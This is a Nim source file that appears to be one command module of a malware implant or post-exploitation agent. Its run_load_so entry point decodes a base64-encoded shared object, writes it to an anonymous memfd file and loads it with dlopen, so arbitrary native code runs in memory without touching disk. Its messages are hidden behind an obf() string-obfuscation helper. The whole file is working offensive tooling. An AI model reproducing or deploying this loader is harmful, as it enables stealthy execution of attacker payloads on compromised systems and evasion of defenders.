from std/base64 import decode
import ../utils/global

{.emit: "#define _GNU_SOURCE\n".}

const
  memFdCloexec = 1
  rtLdNow = 2

proc memfdCreate(name: cstring, flags: cuint): cint {.importc: "memfd_create", header: "sys/mman.h".}
proc dlopen(name: cstring, flag: cint): pointer {.importc, header: "dlfcn.h".}
proc dlclose(handle: pointer): cint {.importc, header: "dlfcn.h".}
proc dlerror(): cstring {.importc, header: "dlfcn.h".}
proc write(fd: cint, buf: pointer, len: csize_t): cint {.importc, header: "unistd.h".}
proc close(fd: cint): cint {.importc, header: "unistd.h".}
proc snprintf(buf: pointer, size: csize_t, format: cstring): cint {.importc, header: "stdio.h", varargs.}

proc writeMsg(msg: string; buf: var openArray[char]): int =
  # Writes a message into the output buffer
  if msg.len > buf.len: return -1
  if msg.len > 0: copyMem(addr buf[0], unsafeAddr msg[0], msg.len)
  msg.len

proc decodeInput(input: string): seq[byte] =
  # Decodes the base64 input into bytes
  if input.len == 0:
    return @[]
  let raw = decode(input)
  result = newSeq[byte](raw.len)
  if raw.len > 0:
    copyMem(addr result[0], unsafeAddr raw[0], raw.len)

proc mapSoFromBytes(payload: openArray[byte]): pointer =
  # Writes the bytes to a memory file and loads the shared object
  if payload.len == 0:
    return nil
  let fd = memfdCreate("", memFdCloexec.cuint)
  if fd < 0:
    return nil
  var off = 0
  while off < payload.len:
    let n = write(fd, cast[pointer](unsafeAddr payload[off]), (payload.len - off).csize_t)
    if n <= 0:
      discard close(fd)
      return nil
    off += int(n)
  var path: array[64, char]
  if snprintf(addr path[0], path.len.csize_t, "/proc/self/fd/%d", fd) < 0:
    discard close(fd)
    return nil
  let handle = dlopen(cast[cstring](addr path[0]), rtLdNow)
  discard close(fd)
  handle

proc run_load_so*(input, params: string; buf: var openArray[char]): int =
  # Entrypoint of the load so route
  let payload = decodeInput(input)
  if payload.len == 0:
    return writeMsg(obf("Error: empty or invalid SO input"), buf)
  let handle = mapSoFromBytes(payload)
  if handle == nil:
    let err = dlerror()
    if err != nil and $err != "":
      return writeMsg(obf("Error: dlopen failed: ") & $err, buf)
    return writeMsg(obf("Error: failed to load SO"), buf)
  discard dlclose(handle)
  writeMsg(obf("SO loaded."), buf)
